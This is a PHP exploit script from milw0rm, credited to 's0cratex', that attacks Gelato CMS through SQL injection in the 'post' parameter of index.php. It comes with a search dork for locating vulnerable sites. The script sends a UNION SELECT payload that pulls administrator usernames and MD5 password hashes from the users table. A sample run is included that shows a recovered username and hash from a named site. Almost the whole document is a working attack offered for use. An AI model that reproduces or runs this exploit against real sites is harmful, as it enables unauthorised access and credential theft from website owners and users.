<?
#_ Gelato SQL Injection exploit
#_ Dork: "powered by gelato cms"
#_ Homepage: http://gelatocms.com

#_ [ s 0 c r a t e x ]
#_ msn: s0cratex[at]nasa[dot]gov
#_ greetz: D.O.M and plexinium team

ini_set("max_execution_time",0);

function get_text(){
  $in = fopen("php://stdin", 'r');
  $text = fgets($in, 1024);
  $text = trim($text);
  return $text; }

echo "Gelato SQL Injection exploit -- by s0cratex\n";
echo "-------------------------------------------\n\n";

echo "Host (site.com): ";
$host = get_text();

echo "Path (/gelato): ";
$path = get_text();

echo "Prefix (gl_ / gel_): ";
$prefix = get_text();

if($host && $path && prefix){
$cnx = fsockopen($host,80);
if($cnx){
fwrite($cnx,"GET
".$path."/index.php?post=-1/**/union/**/select/**/1,concat(0x7330633a3a,login,0x3a3a,password,0x3a3a),null,null,null,null,null/**/from/**/".$prefix."users/*
HTTP/1.0\r\nHost: ".$host."\r\n\r\n");
while(!feof($cnx)){ $resp .= fgets($cnx); }
fclose($cnx);

$login = strstr($resp,"s0c");
$login = explode("::",$login);
if(is_null($login[1]) || is_null($login[2])){ die("\nExploit failed... check
the prefix..."); }
echo "\nUsername: ".$login[1];
echo "\nMD5 Hash: ".$login[2];
} else { die("\nConection problems..."); }
} else { die("\nPlease check the data..."); }

/*
Gelato SQL Injection exploit -- by s0cratex
-------------------------------------------

Host (site.com): gelatocms.it
Path (/gelato): /
Prefix (gl_ / gel_): gel_

Username: wolly
MD5 Hash: 2eb7401af28ae266360b6028a26cc97a */

?>

# milw0rm.com [2007-09-14]
